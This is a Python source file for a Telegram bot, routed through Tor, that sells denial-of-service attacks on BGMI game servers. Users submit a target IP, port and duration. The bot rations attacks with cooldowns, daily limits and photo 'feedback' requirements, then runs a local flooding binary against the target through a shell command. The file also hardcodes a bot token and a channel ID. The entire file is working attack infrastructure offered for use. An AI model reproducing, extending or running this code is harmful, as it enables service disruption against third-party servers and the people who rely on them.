import os
import telebot
import logging
import asyncio
import socks
import socket
from datetime import datetime, timedelta, timezone

# Set default proxy to Tor (SOCKS5 on localhost)
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Telegram bot token and channel ID
TOKEN = '8047907032:AAFvVx2Dkhp55zsCbv8m0mDaAcWFnoHSPes'
CHANNEL_ID = '-1002204038475'
bot = telebot.TeleBot(TOKEN)

user_attacks = {}
user_cooldowns = {}
user_photos = {}
user_bans = {}
active_attackers = set()
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)

COOLDOWN_DURATION = 60
BAN_DURATION = timedelta(minutes=1)
DAILY_ATTACK_LIMIT = 15
EXEMPTED_USERS = [5712886230]
MAX_CONCURRENT_ATTACKS = 3

def reset_daily_counts():
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)

def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_photos[message.from_user.id] = True

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global user_attacks, user_cooldowns, user_photos, user_bans, active_attackers
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"

    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, " ⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 𝐂𝐎𝐌𝐄 𝐈𝐍 𝐆𝐑𝐎𝐔𝐏 :- @nobanbgmihackz  ⚠️ ")
        return

    reset_daily_counts()

    if user_id in user_bans:
        ban_expiry = user_bans[user_id]
        if datetime.now() < ban_expiry:
            remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
            minutes, seconds = divmod(remaining_ban_time, 60)
            bot.send_message(message.chat.id, f"⚠️⚠️ 𝙃𝙞 {user_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙... {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨")
            return
        else:
            del user_bans[user_id]

    if user_id not in EXEMPTED_USERS:
        if user_id in user_cooldowns:
            cooldown_time = user_cooldowns[user_id]
            if datetime.now() < cooldown_time:
                remaining_time = (cooldown_time - datetime.now()).seconds
                bot.send_message(message.chat.id, f"⚠️⚠️ 𝙃𝙞 {user_name}, 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 {remaining_time // 60}m {remaining_time % 60}s")
                return

        if user_id not in user_attacks:
            user_attacks[user_id] = 0

        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
            bot.send_message(message.chat.id, f"𝙃𝙞 {user_name}, 𝙮𝙤𝙪 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙙𝙖𝙞𝙡𝙮 𝙡𝙞𝙢𝙞𝙩 ✌️")
            return

        if user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
            user_bans[user_id] = datetime.now() + BAN_DURATION
            bot.send_message(message.chat.id, f"𝙃𝙞 {user_name}, ⚠️𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙧𝙚𝙦𝙪𝙞𝙧𝙚𝙙. 𝘽𝙖𝙣𝙣𝙚𝙙 2 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️")
            return

    if len(active_attackers) >= MAX_CONCURRENT_ATTACKS:
        bot.send_message(message.chat.id, f"⚠️ 𝙃𝙞 {user_name}, 𝙢𝙖𝙭 3 𝙢𝙚𝙢𝙗𝙚𝙧𝙨 𝙘𝙖𝙣 𝙖𝙩𝙩𝙖𝙘𝙠 𝙖𝙩 𝙖 𝙩𝙞𝙢𝙚. 𝙏𝙧𝙮 𝙡𝙖𝙩𝙚𝙧.")
        return

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            raise ValueError("""┊★ȺŁØNɆ☂࿐ꔪ┊™ Dildos 💞 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ 

 ⚙ /bgmi <ip> <port> <duration>""")

        target_ip, target_port, user_duration = args
        MAX_DURATION = 180
        if int(user_duration) > MAX_DURATION:
            bot.send_message(message.chat.id, f"⛔ 𝘿𝙪𝙧𝙖𝙩𝙞𝙤𝙣 > {MAX_DURATION}")
            return
        if not is_valid_ip(target_ip): raise ValueError("Invalid IP")
        if not is_valid_port(target_port): raise ValueError("Invalid Port")
        if not is_valid_duration(user_duration): raise ValueError("Invalid Duration")

        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] += 1
            user_photos[user_id] = False
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        active_attackers.add(user_id)

        bot.send_message(message.chat.id, f"🚀𝙃𝙞 {user_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙\n\n REQUESTED TARGET : {target_ip}\n\n REQUESTED PORT : {target_port}\n\n REQUESTED TIME : {user_duration}s\n\n ✅ 𝙎𝙚𝙣𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 to do next attack")

        asyncio.run(run_attack_command_async(target_ip, int(target_port), int(user_duration), user_duration, user_name, user_id))

    except Exception as e:
        bot.send_message(message.chat.id, str(e))

async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name, user_id):
    try:
        command = f"./fuck {target_ip} {target_port} {duration}"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        bot.send_message(CHANNEL_ID, f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 Finished ❣️\n\nRequested ip : {target_ip} \nPort : {target_port}\nTime: {user_duration}s\n\n𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 💘 <> 𝗧𝗲𝗮𝗺 ★ȺŁØNɆ☂ꔪ™")
    except Exception as e:
        bot.send_message(CHANNEL_ID, f"Error: {e}")
    finally:
        active_attackers.discard(user_id)

if __name__ == "__main__":
    logging.info("Bot is starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")
